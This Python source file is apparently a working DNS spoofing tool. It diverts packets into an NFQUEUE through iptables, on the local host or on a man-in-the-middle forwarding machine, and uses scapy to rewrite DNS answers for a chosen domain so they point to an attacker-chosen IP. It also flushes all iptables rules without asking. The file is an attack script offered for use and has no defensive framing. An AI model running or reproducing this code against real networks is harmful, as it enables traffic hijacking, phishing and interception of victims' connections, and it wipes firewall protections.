import netfilterqueue
from scapy.layers.inet import IP, UDP
from scapy.arch import get_if_addr
from scapy.config import conf
from scapy.layers.dns import DNSRR, DNS, DNSQR
import argparse
import os

TARGET = get_if_addr(conf.iface) #IP of DEFAULT INTERFACE
DOMAIN = 'www.google.com' #DEFAULT DOMAIN

class NoIPFormat(Exception):
    '''
    No correct format of IP address
    '''

    pass

def check_format_IP(IP_address):
    '''
    Check format of IP address specified
    '''

    #params[0]=IP 
    #params[1]=number of bits of netmask   
    IP_numbers = IP_address.split('.')
    
    #Error if number of IP fields isn't equal to 4
    if not len(IP_numbers)==4:
        raise NoIPFormat()
    else:
        #Check each IP field value is correct (>=0 and <256)
        for num in IP_numbers:
            if(int(num)>255 or int(num)<0):
                raise NoIPFormat

    return IP_address

def process_packet(packet):
    '''
    Process each packet
    '''

    global DOMAIN, TARGET
    IP_pkt = IP(packet.get_payload())

    #It's a DNS Response (DNS Record Route)
    if(IP_pkt.haslayer(DNSRR)):
        #Name to be translated through DNS Query Record
        domain = IP_pkt[DNSQR].qname

        #DNS resolution response for DOMAIN domain
        if DOMAIN in str(domain):
            print("Spoofing target")
            answer = DNSRR(rrname=domain, rdata=TARGET)
            IP_pkt[DNS].an = answer
            #Only 1 DNS record (only 1 IP related to target)
            IP_pkt[DNS].ancount = 1
            
            #Delete checksum, len of IP packet and UDP packet
            #(scapy then recalculate automatically them using inserted fields)
            del IP_pkt[IP].len
            del IP_pkt[IP].chksum
            del IP_pkt[UDP].len
            del IP_pkt[UDP].chksum

    #Set new payload and accept it
    packet.set_payload(bytes(IP_pkt))
    packet.accept()


def args_parser():
    '''
    Parser of command line argument
    '''

    global TARGET, DOMAIN
    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-local", "-l", dest="local", help="If specified, IPTABLES updated to run program on local. Otherwise it works on forward machine (e.g. with arp spoofing).", action='store_true')
    parser.add_argument("-interface", "-i", dest="interface", help="Name of the network interface of your machine")
    parser.add_argument("-domain", "-d", dest="domain", help="Domain on which DNS spoofing is performed")
    parser.add_argument("-target", "-t", dest="target", help="IP address to substitute in DNS Record Route of specified domain")

    #Parse command line arguments
    args = parser.parse_args()

    #Check if the name of the network interface and the target domain have been specified
    if args.interface:
        #If specified interface, no specification of domain
        if args.target:
            parser.print_help()
            exit(1)
        else:
            TARGET = get_if_addr(args.interface)

    try:
        if args.target:
            TARGET = check_format_IP(args.target)
    except NoIPFormat:
        parser.print_help()
        exit(1)

    if args.domain:
        DOMAIN = args.domain

    return args.local

def main():
    #Parser of command line arguments
    local = args_parser()

    if local:
        os.system('iptables -F')
        os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
        os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
    else:
        os.system('iptables -F')
        os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')


    #O = queue num
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)

    try:
        queue.run()
    except KeyboardInterrupt:
        queue.unbind()
        print('Flushing ip table.', end='\n\n')
        os.system('iptables -F')


if __name__=='__main__':
	main()
